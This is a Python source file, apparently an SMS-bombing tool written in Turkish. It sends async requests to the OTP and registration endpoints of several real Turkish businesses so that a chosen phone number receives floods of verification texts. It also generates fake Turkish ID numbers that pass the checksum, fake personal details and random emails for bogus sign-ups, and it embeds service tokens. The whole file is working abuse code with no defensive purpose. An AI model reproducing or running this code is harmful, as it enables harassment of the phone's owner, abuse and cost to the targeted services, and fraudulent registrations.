import httpx
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms():
    def __init__(self, phone, mail):
        self.adet = 0
        # TC No simülasyonu
        rakam = [randint(1,9)]
        for _ in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append(sum(rakam[:10]) % 10)
        self.tc = "".join(map(str, rakam))
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    async def _post(self, url, name, headers=None, json=None, data=None):
        """Asenkron POST isteği atan yardımcı metod"""
        try:
            async with httpx.AsyncClient() as client:
                r = await client.post(url, headers=headers, json=json, data=data, timeout=6)
                # Servislerin başarılı dönüş kodları genelde 200 veya 202'dir
                if r.status_code in [200, 201, 202]:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> {name}")
                    self.adet += 1
                else: raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> {name}")

    async def KahveDunyasi(self):
        url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web"}
        await self._post(url, "api.kahvedunyasi.com", headers=headers, json={"countryCode": "90", "phoneNumber": self.phone})

    async def Bim(self):
        await self._post("https://bim.veesk.net:443/service/v1.0/account/login", "bim.veesk.net", json={"phone": self.phone})

    async def Englishhome(self):
        url = "https://www.englishhome.com:443/api/member/sendOtp"
        await self._post(url, "englishhome.com", json={"Phone": self.phone, "XID": ""})

    async def Ido(self):
        url = "https://api.ido.com.tr:443/idows/v2/register"
        payload = {
            "birthDate": True, "email": self.mail, "firstName": "MEMATI", "gender": "MALE",
            "lastName": "BAS", "mobileNumber": f"0{self.phone}", "pwd": "313131",
            "tckn": self.tc, "termsOfUse": True, "year": 1977
        }
        await self._post(url, "api.ido.com.tr", json=payload)

    async def TiklaGelsin(self):
        url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
        json_data = {
            "operationName": "GENERATE_OTP",
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
            "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}
        }
        await self._post(url, "tiklagelsin.com", json=json_data)

    async def Suiste(self):
        url = "https://suiste.com:443/api/auth/code"
        data = {"action": "register", "full_name": "Memati Bas", "gsm": self.phone, "password": "31MeMaTi31"}
        await self._post(url, "suiste.com", data=data)

    async def Akbati(self):
        url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
        headers = {"X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"}
        await self._post(url, "akbatiapi.poilabs.com", headers=headers, json={"phone": self.phone})

    async def Komagene(self):
        url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
        await self._post(url, "gateway.komagene.com", json={"FirmaId": 32, "Telefon": self.phone})

    async def Metro(self):
        url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        await self._post(url, "mobile.metro-tr.com", json={"methodType": "2", "mobilePhoneNumber": self.phone})
